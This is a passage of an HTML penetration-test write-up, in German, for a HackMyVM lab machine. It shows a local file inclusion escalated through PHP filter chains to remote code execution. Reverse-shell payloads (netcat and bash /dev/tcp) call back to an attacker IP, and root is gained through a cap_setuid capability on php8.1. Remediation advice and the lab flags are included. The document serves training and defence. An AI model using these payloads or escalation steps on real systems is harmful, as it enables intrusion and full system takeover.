onvert.iconv.CSIBM1161.UNICDE|convert.iconv.IS-IR-156.JHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IS2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
+                      </pre>
+                  </div>
+              </div>
+              <div class="code-block">
+                   <div class="terminal">
+                       <pre>
+ # Exploit URL (gekürzt für Lesbarkeit)
+ http://192.168.2.123/index.php?page=php://filter/...[Lange Filterkette].../resource=php://temp&cmd=id
+
+ # Erwartete Ausgabe (nicht im Text gezeigt):
+ uid=33(www-data) gid=33(www-data) groups=33(www-data)
+                       </pre> <!-- Maskierung ? & | = -->
+                   </div>
+               </div>
+               <div class="code-block">
+                    <div class="terminal">
+                        <pre>
+ # Exploit URL für Reverse Shell (gekürzt)
+ http://192.168.2.123/index.php?page=php://filter/...[Lange Filterkette].../resource=php://temp&cmd=nc%20-e%20/bin/bash%20192.168.2.199%204321
+                        </pre> <!-- Maskierung ? & | = % -->
+                    </div>
+                </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Ein Netcat-Listener wird auf Port 4321 gestartet. Kurz darauf wird die LFI-RCE-URL mit einem Netcat-Reverse-Shell-Payload (der `/bin/bash` an den Angreifer bindet) aufgerufen.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> **Initial Access via Reverse Shell erfolgreich!** Der Listener empfängt die Verbindung, und eine interaktive Shell als `www-data` wird erlangt.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Stabilisiere die Shell und beginne mit der Enumeration als `www-data`.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> LFI beheben, ausgehende Verbindungen überwachen/filtern.
+             </p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">
+  ┌──(root㉿cyber)-[~]
+  └─# <span class="command">nc -lvnp 4321</span>
+                      </div>
+                      <pre>
+ listening on [any] 4321 ...
+ connect to [192.168.2.199] from (UNKNWN) [192.168.2.123] XX:XX <!-- Port nicht sichtbar -->
+ # Shell erhalten (Ausgabe nicht gezeigt, aber impliziert)
+                      </pre>
+                  </div>
+              </div>
+              <div class="code-block">
+                   <div class="terminal">
+                       <pre>
+ # Alternativer Versuch mit anderer Portnummer und Shell (führt zum gleichen Ergebnis)
+ GET /file.php?file=php://filter/...[Lange Filterkette].../resource=php://temp&cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F4444%200%3E%261%27 HTTP/1.1
+                       </pre> <!-- Maskierung ? & | = % ' -->
+                   </div>
+               </div>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">
+   ┌──(root㉿cyber)-[~]
+   └─# <span class="command">nc -lvnp 4444</span>
+                       </div>
+                       <pre>
+ listening on [any] 4444 ...
+ connect to [192.168.2.199] from (UNKNWN) [192.168.2.123] 54594
+ bash: cannot set terminal process group (25275): Inappropriate ioctl for device
+ bash: no job control in this shell
+ www-data@quick2:/var/www/html$
+                       </pre>
+                   </div>
+               </div>
+          </section>
+
+         <section id="poc-initial-access">
+              <h2>Proof of Concept (Initial Access - LFI to RCE)</h2>
+              <p class="analysis">
+                  <strong>Analyse:</strong> Dieser POC fasst die Schritte zur Erlangung einer Reverse Shell als `www-data` über die Local File Inclusion (LFI)-Schwachstelle und deren Eskalation zu Remote Code Execution (RCE) mittels PHP-Filtern zusammen.
+              </p>
+              <p>
+                  <strong>Schwachstelle:</strong> LFI im `page`-Parameter von `index.php` (oder `file.php`), die das Einbinden beliebiger lokaler Dateien erlaubt. Ausnutzung von `php://filter` in Kombination mit `convert.iconv.*` und `convert.base64-*` zur Umgehung von Einschränkungen und zur Ausführung von Code über `php://temp`.
+              </p>
+              <p>
+                  <strong>Voraussetzungen:</strong> Webzugriff auf `index.php` oder `file.php`. Ein Tool zur Generierung von PHP-Filterketten (z.B. `php_filter_chain_generator.py`). Ein Listener auf dem Angreifer-System.
+              </p>
+              <p>
+                  <strong>Schritte zur Reproduktion:</strong>
+                  <ol>
+                      <li>Identifiziere die LFI (z.B. mit Nikto oder manuell: `curl http://192.168.2.123/index.php?page=../../etc/passwd`).</li>
+                      <li>Generiere eine PHP-Filterkette für einen RCE-Payload, z.B. ``<?=`$_GET[cmd]`?>``: <br> `python3 php_filter_chain_generator.py --chain '<?=`$_GET[cmd]`?>'` </li>
+                      <li>Starte einen Netcat-Listener: `nc -lvnp 4444`.</li>
+                      <li>Konstruiere die Exploit-URL, indem du die generierte Filterkette als Wert für den `page`-Parameter einsetzt und einen URL-kodierten Reverse-Shell-Payload als `cmd`-Parameter anhängst: <br> `http://192.168.2.123/index.php?page=php://filter/...[Filterkette].../resource=php://temp&cmd=nc%20-e%20/bin/bash%20[IP_Angreifer]%204444`</li>
+                      <li>Rufe die Exploit-URL auf (z.B. mit `curl`).</li>
+                  </ol>
+              </p>
+              <p>
+                  <strong>Erwartetes Ergebnis:</strong> Eine Reverse Shell verbindet sich zum Listener und gewährt Zugriff als `www-data`.
+              </p>
+               <p class="recommendation">
+                  <strong>Empfehlung (Admin):</strong> **LFI-Schwachstelle dringend beheben!** Implementieren Sie eine Whitelist für erlaubte Include-Dateien. Deaktivieren Sie unsichere PHP-Wrapper und -Funktionen in `php.ini`. Aktualisieren Sie PHP und Apache.
+              </p>
+          </section>
+
+         <section id="post-exploitation">
+             <h2>Post-Exploitation Enumeration (as www-data)</h2>
+              <p class="analysis">
+                  <strong>Analyse:</strong> Als `www-data` werden Enumerationsbefehle ausgeführt: `ls -la` im Web-Root, `id`, `/etc/passwd`-Berechtigungen, `getcap` und `find` nach SUID-Dateien.
+              </p>
+              <p class="evaluation">
+                  <strong>Bewertung:</strong>
+                  *   Die Dateiliste zeigt Standard-Webdateien.
+                  *   `id` bestätigt `www-data`.
+                  *   `/etc/passwd` ist normal lesbar.
+                  *   **Wichtiger Fund bei `getcap`:** `/usr/bin/php8.1` hat die Capability `cap_setuid=ep` gesetzt. Dies erlaubt PHP-Skripten, die effektive User-ID zu ändern (z.B. zu Root, wenn das Skript als Root gestartet wird oder dies erlaubt ist).
+                  *   **SUID-Suche:** Findet viele Standard- und Snap-Dateien, aber keine offensichtlich einfache Schwachstelle.
+                  Die `cap_setuid`-Capability für PHP ist der entscheidende Fund hier.
+              </p>
+              <p class="recommendation">
+                  <strong>Empfehlung (Pentester):</strong> Nutze die `cap_setuid`-Capability von `php8.1` zur Privilege Escalation. Erstelle ein einfaches PHP-Skript oder einen Einzeiler, der `posix_setuid(0)` aufruft, um zu Root zu werden, und dann eine Shell startet (`system('/bin/bash')`).
+                  <br>
+                  <strong>Empfehlung (Admin):</strong> Entfernen Sie unnötige Capabilities von Binärdateien, insbesondere `cap_setuid` von Interpretern wie PHP, Python etc. (`setcap cap_setuid-ep /usr/bin/php8.1`). Verwenden Sie Capabilities nur, wenn sie absolut notwendig sind und mit Bedacht.
+              </p>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt" style="color: yellow;">
+ www-data@quick2:/var/www/html$ <span class="command">ls -la</span>
+                       </div>
+                       <pre>
+ total 56
+ drwxr-xr-x 3 root     root     4096 Jan 29 19:13 .
+ drwxr-xr-x 3 root     root     4096 Jan 12 21:03 ..
+ -rw-r--r-- 1 andrew   andrew   1446 Nov 27 20:25 about.php
+ -rw-r--r-- 1 andrew   andrew   1502 Dec  4 07:56 cars.php
+ -rw-r--r-- 1 andrew   andrew    254 Nov 24 09:55 connect.php
+ -rw-r--r-- 1 andrew   andrew   1395 Nov 27 20:01 contact.php
+ -rw-r--r-- 1 www-data www-data  290 Jan 12 21:28 file.php
+ -rw-r--r-- 1 andrew   andrew   2539 Jan 14 10:15 home.php
+ drwxr-xr-x 2 andrew   andrew   4096 Dec  4 09:02 images
+ -rw-r--r-- 1 andrew   andrew   1537 Jan 29 19:13 index.php
+ -rw-r--r-- 1 andrew   andrew    853 Jan 13 19:54 maintenance_and_repair.php
+ -rw-r--r-- 1 root     root      560 Jan 14 11:16 news.php
+ -rw-r--r-- 1 andrew   andrew    593 Nov 24 13:01 send_email.php
+ -rw-r--r-- 1 andrew   andrew   4038 Dec  4 08:39 styles.css
+                       </pre>
+                   </div>
+               </div>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt" style="color: yellow;">
+ www-data@quick2:/var/www/html$ <span class="command">id</span>
+                       </div>
+                       <pre>
+ uid=33(www-data) gid=33(www-data) groups=33(www-data)
+                       </pre>
+                   </div>
+               </div>
+                <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt" style="color: yellow;">
+ www-data@quick2:/var/www/html$ <span class="command">ls -la /etc/passwd</span>
+                       </div>
+                       <pre>
+ -rw-r--r-- 1 root root 1818 Jan 14 10:14 /etc/passwd
+                       </pre>
+                   </div>
+               </div>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt" style="color: yellow;">
+ www-data@quick2:/var/www/html$ <span class="command">getcap -r / 2>/dev/null</span>
+                       </div>
+                       <pre>
+ /usr/bin/ping cap_net_raw=ep
+ /usr/bin/mtr-packet cap_net_raw=ep
+ <span style="color:red; font-weight:bold;">/usr/bin/php8.1 cap_setuid=ep</span>
+ /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+ /snap/core20/1405/usr/bin/ping cap_net_raw=ep
+                       </pre>
+                   </div>
+               </div>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt" style="color: yellow;">
+ www-data@quick2:/var/www/html$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span>
+                       </div>
+                       <pre>
+     10095     60 -rwsr-xr-x   1 root     root        59976 Feb  6 12:54 /usr/bin/passwd
+     # ... (viele Standard SUID/Snap Dateien) ...
+      1102    163 -rwsr-xr-x   1 root     root         166056 Jan 19  2021 /snap/core20/1405/usr/bin/sudo
+      # ... (viele Standard SUID/Snap Dateien) ...
+       297    129 -rwsr-xr-x   1 root     root              131832 Nov 29 14:54 /snap/snapd/20671/usr/lib/snapd/snap-confine
+                       </pre>
+                   </div>
+               </div>
+               <!-- Weitere Enumeration übersprungen, da nicht direkt relevant für Privesc -->
+          </section>
+
+          <section id="privilege-escalation">
+              <h2>Privilege Escalation (PHP Capability)</h2>
+               <p class="analysis">
+                   <strong>Analyse:</strong> Die zuvor identifizierte `cap_setuid=ep`-Capability von `/usr/bin/php8.1` wird ausgenutzt. Mit dem Befehl `php8.1 -r "posix_setuid(0); system('/bin/bash');"` wird ein PHP-Einzeiler ausgeführt.
+                   *   `-r "..."`: Führt PHP-Code direkt aus der Kommandozeile aus.
+                   *   `posix_setuid(0);`: Versucht, die effektive User-ID des Prozesses auf 0 (root) zu setzen. Dies ist aufgrund der `cap_setuid`-Capability erlaubt.
+                   *   `system('/bin/bash');`: Startet eine neue Bash-Shell, die nun mit den (durch `posix_setuid`) geänderten Root-Rechten läuft.
+               </p>
+               <p class="evaluation">
+                   <strong>Bewertung:</strong> **Privilege Escalation erfolgreich!** Der Befehl funktioniert wie erwartet. Die `id`-Ausgabe in der neuen Shell zeigt `uid=0(root)`, was bestätigt, dass Root-Rechte erlangt wurden.
+               </p>
+               <p class="recommendation">
+                   <strong>Empfehlung (Pentester):</strong> Root-Zugriff erreicht. Lese die Root-Flag (`/root/root.txt`).
+                   <br>
+                   <strong>Empfehlung (Admin):</strong> **Entfernen Sie die `cap_setuid`-Capability von PHP** (`setcap cap_setuid-ep /usr/bin/php8.1`). Capabilities sollten nur gezielt und mit Bedacht vergeben werden.
+               </p>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt" style="color: yellow;">
+ www-data@quick2:/tmp$ <span class="command">CMD="/bin/bash"</span>
+                       </div>
+                    </div>
+                </div>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt" style="color: yellow;">
+ www-data@quick2:/tmp$ <span class="command">php8.1 -r "posix_setuid(0); system('$CMD');"</span>
+                       </div>
+                       <div class="prompt" style="color: red;"> <!-- Neue Root-Shell -->
+ root@quick2:/tmp# <span class="command">id</span>
+                       </div>
+                       <pre>
+ uid=0(root) gid=33(www-data) groups=33(www-data)
+                       </pre>
+                   </div>
+               </div>
+               <!-- Linpeas-Output und weitere erfolglose Versuche übersprungen -->
+           </section>
+
+           <section id="poc-privesc">
+               <h2>Proof of Concept (Privilege Escalation - PHP Capability)</h2>
+                <p class="analysis">
+                   <strong>Analyse:</strong> Dieser POC beschreibt die Ausnutzung der `cap_setuid`-Capability der PHP-Binary zur Erlangung von Root-Rechten.
+               </p>
+                <p>
+                   <strong>Schwachstelle:</strong> Die PHP-Executable (`/usr/bin/php8.1`) besitzt die Linux Capability `cap_setuid=ep`, welche es durch PHP ausgeführten Prozessen erlaubt, ihre effektive User-ID zu ändern.
+               </p>
+               <p>
+                   <strong>Voraussetzungen:</strong> Shell-Zugriff als nicht-privilegierter Benutzer (hier `www-data`). Die PHP-Binary muss die `cap_setuid`-Capability besitzen.
+               </p>
+               <p>
+                   <strong>Schritte zur Reproduktion:</strong>
+                   <ol>
+                       <li>Erlange eine Shell als `www-data` (z.B. via LFI->RCE).</li>
+                       <li>Überprüfe die Capabilities von PHP: `getcap /usr/bin/php8.1`. Bestätige das Vorhandensein von `cap_setuid=ep`.</li>
+                       <li>Führe folgenden Befehl aus, um eine Root-Shell zu starten: `php8.1 -r "posix_setuid(0); system('/bin/bash -p');"` (die Option `-p` für Bash ist hier zusätzlich empfohlen, um die effektive UID sicher beizubehalten).</li>
+                       <li>Überprüfe die Rechte in der neuen Shell mit `id`.</li>
+                   </ol>
+               </p>
+               <p>
+                   <strong>Erwartetes Ergebnis:</strong> Eine neue Bash-Shell wird gestartet, und der `id`-Befehl zeigt `euid=0(root)` oder `uid=0(root)`, was Root-Zugriff bestätigt.
+               </p>
+                <p class="recommendation">
+                   <strong>Empfehlung (Admin):</strong> **Entfernen Sie die `cap_setuid`-Capability von der PHP-Binary** (`sudo setcap cap_setuid-ep /usr/bin/php8.1`). Überprüfen Sie regelmäßig die Capabilities kritischer Systemdateien und entfernen Sie unnötige Berechtigungen.
+               </p>
+           </section>
+
+          <section id="flags">
+              <div class="flag-container">
+                  <h2 class="flag-heading">Flags</h2>
+
+                   <div class="flag-entry">
+                      <div class="flag-command">cat /home/nick/user.txt</div>
+                      <div class="flag-value"><span class="password">HMV{Its-gonna-be-a-fast-ride}</span></div>
+                  </div>
+
+                  <div class="flag-entry">
+                      <div class="flag-command">cat /root/root.txt</div>
+                      <div class="flag-value"><span class="password">HMV{This-was-a-Quick-AND-fast-machine}</span></div>
+                  </div>
+              </div>
+          </section> 
+
+      <footer class="footer">
+          <p>DarkSpirit - Cyber Security Reports</p>
+          <p>Berichtsdatum: 2024-05-09</p> <!-- Datum aus Nmap Scan -->
+      </footer>
+  </body>
+  </html>
